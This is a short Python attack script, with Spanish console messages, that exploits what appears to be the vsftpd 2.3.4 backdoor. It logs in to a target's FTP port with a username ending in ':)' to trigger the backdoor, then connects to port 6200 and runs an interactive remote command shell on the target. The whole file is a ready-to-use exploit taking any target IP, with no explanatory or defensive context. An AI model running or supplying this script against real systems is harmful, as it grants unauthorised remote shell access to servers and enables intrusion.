#!/usr/bin/env python3

import socket
import sys
import time

def send_trigger(target_ip, port=21):
    print(f"[*] Conectando a {target_ip}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, port))
        banner = s.recv(1024).decode()
        print(f"[+] Banner recibido: {banner.strip()}")
        
        s.sendall(b"USER test:)\r\n")
        time.sleep(1)
        s.sendall(b"PASS test\r\n")
        time.sleep(1)
        s.close()
        print("[+] Trigger enviado correctamente.")
        return True
    except Exception as e:
        print(f"[!] Error al enviar el trigger: {e}")
        return False

def connect_shell(target_ip, shell_port=6200):
    print(f"[*] Intentando conectar a shell en {target_ip}:{shell_port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, shell_port))
        print("[+] Conectado al shell. Escribe comandos...\n")

        while True:
            cmd = input("shell> ")
            if cmd.strip() == "exit":
                break
            s.sendall(cmd.encode() + b"\n")
            time.sleep(1)
            response = s.recv(4096)
            print(response.decode(errors="ignore"))
        s.close()
    except Exception as e:
        print(f"[!] No se pudo conectar al shell: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python3 {sys.argv[0]} <IP objetivo>")
        sys.exit(1)

    target = sys.argv[1]
    if send_trigger(target):
        time.sleep(2)
        connect_shell(target)
